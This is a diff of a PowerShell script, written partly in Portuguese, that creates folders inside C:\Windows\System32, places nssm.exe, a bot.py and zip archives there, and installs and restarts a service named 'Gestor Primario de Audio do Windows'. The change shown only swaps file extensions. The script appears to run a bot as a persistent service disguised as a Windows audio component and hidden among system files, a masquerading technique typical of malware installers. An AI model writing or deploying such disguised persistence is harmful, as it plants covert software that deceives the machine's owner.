@@ -1,8 +1,8 @@
 $destino = 'C:\Windows\System32\ap32\nssm.exe'
 $destino2 = 'C:\Windows\System32\ap32\bot.py'
-$destino3 = 'C:\Windows\System32\re-as\WPy64.zip.py'
-$destino4 = 'C:\Windows\System32\re-as\WPy64.zip_2.py'
-$destino5 = 'C:\Windows\System32\ap32\Res-PE\scripts.py'
+$destino3 = 'C:\Windows\System32\re-as\WPy64.zip'
+$destino4 = 'C:\Windows\System32\re-as\WPy64_2.zip'
+$destino5 = 'C:\Windows\System32\ap32\Res-PE\scripts.zip'
 
 New-Item -Path "C:\Windows\System32\re-as" -ItemType Directory
 New-Item -Path "C:\Windows\System32\ap32" -ItemType Directory
@@ -22,3 +22,4 @@ C:\Windows\System32\ap32\nssm.exe install "Gestor Primario de Audio do Windows" 
 C:\Windows\System32\ap32\nssm.exe restart "Gestor Primario de Audio do Windows"
 
 exit
+
